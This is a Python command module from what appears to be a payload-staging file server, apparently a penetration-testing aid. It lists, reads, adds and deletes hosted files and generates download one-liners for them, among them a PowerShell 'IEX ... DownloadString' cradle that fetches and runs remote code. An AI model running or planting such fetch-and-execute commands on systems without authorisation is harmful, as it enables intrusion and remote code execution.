from core import logger, arguments
import os, mimetypes
from shutil import copy

args = arguments.get_args()

def do(cmd):
	if 'list' in cmd:
		get_hosted_files()

	if 'config' in cmd:
		logger.msg(f'Server is currently configured to: ',f'{args.server_address}:{args.server_port}','blue')

	if 'generate' in cmd:
		if cmd.startswith('generate '):
			cmd = cmd.split(' ')[1:]
			generate_command(cmd)

	if 'read' in cmd:
		if cmd.startswith('read '):
			cmd = cmd.split(' ')[1]
			read_file(cmd)

	if 'add' in cmd:
		if cmd.startswith('add '):
			cmd = cmd.split(' ')[1]
			add_file(cmd)

	if 'delete' in cmd:
		if cmd.startswith('delete '):
			cmd = cmd.split(' ')[1]
			delete_file(cmd)

	if 'exit' in cmd:
		logger.msg('CTRL+C to kill the server!',None,'red')
		quit()
def get_hosted_files():
	hosted_path = './'
	url = f'http://{args.server_address}:{args.server_port}/'
	if not os.path.exists(hosted_path):
		logger.msg('Creating directory: ',hosted_path,'blue')
		os.mkdir(hosted_path)
	else:
		files = os.listdir(hosted_path)
		logger.list_dir(url,files)
		print()

def generate_command(cmd):
	files = os.listdir(args.directory)
	url = f'http://{args.server_address}:{args.server_port}/'
	commands = []

	if len(cmd) == 1:
		cmd = cmd[0]
		for f in files:
			commands.append(build_command(cmd, url, f))
	elif len(cmd) == 2:
		t = cmd[0]
		f = cmd[1]
		commands.append(build_command(t,url,f))
	logger.list_commands(commands)

def build_command(cmd, url, f):
	if cmd == 'curl':
		return f'curl {url}{f} --output {f}'
	if cmd == 'wget':
		return f'wget {url}{f}'
	if cmd == 'Invoke-WebRequest':
		return f'Invoke-WebRequest -Uri {url}{f} -OutFile {f}'
	if cmd == 'DownloadString':
		return f'powershell.exe -c IEX (New-Object Net.WebClient).DownloadString({url}{f})'

def read_file(cmd):
	if args.directory.endswith('/'):
		file_to_read = args.directory + cmd
	else:
		file_to_read = args.directory + '/' + cmd

	try:
		with open(file_to_read,'r') as f:
			logger.msg('Contents of ',file_to_read+':','green')
			print(f.read())
	except UnicodeDecodeError as e:
		logger.msg('Unable to read ',file_to_read,'red')
		return 1

def add_file(cmd):
	from_location = cmd
	to_location = args.directory
	try:
		copy(from_location,to_location)
		logger.msg(f'Copied {from_location} to ', to_location,'green')
		return 0
	except  Exception as e:
		logger.msg('Error: ',e,'red')
		return 1

def delete_file(cmd):
	if args.directory.endswith('/'):
		file_to_delete = args.directory + cmd
	else:
		file_to_delete = args.directory + '/' + cmd
	try:
		os.remove(file_to_delete)
		logger.msg(f'Deleted ', file_to_delete,'green')
		return 0
	except Exception as e:
		logger.msg('Error: ',e,'red')
		return 1